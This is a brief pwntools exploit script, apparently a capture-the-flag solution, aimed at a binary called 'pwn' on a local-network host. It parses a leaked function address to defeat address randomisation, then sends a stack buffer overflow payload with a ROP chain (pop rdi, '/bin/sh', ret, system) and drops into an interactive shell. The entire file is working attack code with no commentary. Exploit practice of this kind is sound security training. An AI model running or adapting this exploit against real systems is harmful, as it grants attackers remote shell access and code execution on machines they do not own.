from pwn import * 
from pwn import p64,u64
debug = 0
gdb_is = 0
# context(arch='i386',os = 'linux')
context(arch='amd64',os = 'linux', log_level='DEBUG')
if debug:
    context.terminal = ['/mnt/c/Users/sagiriking/AppData/Local/Microsoft/WindowsApps/wt.exe','nt','Ubuntu','-c']
    r = process("./pwn")
    
else:
    host = "192.168.0.111:57201"
    r = connect(host.split(':')[0],host.split(':')[1])#远程连接
    gdb_is =0

if gdb_is:
    # r = gdb.debug("./pwn",'b ')
    # gdb.attach(r,'b ')
    # gdb.attach(r)
    pause()
elf = ELF('./pwn')
r.recvuntil(b"Vuln's address is:")
vuln_addr = int(r.recvuntil(b'\n')[2:-1].decode(),16)
offset = vuln_addr - elf.sym['vuln']
elf.address = offset
pop_rdi = 0x001323 + offset
binsh = 0x000004010 + offset
ret = 0x000000101a+ offset
paylod = b'A'*80 + b'junkjunk' + p64(pop_rdi) + p64(binsh) + p64(ret)+ p64(elf.sym['system'])
r.send(paylod)
r.interactive()
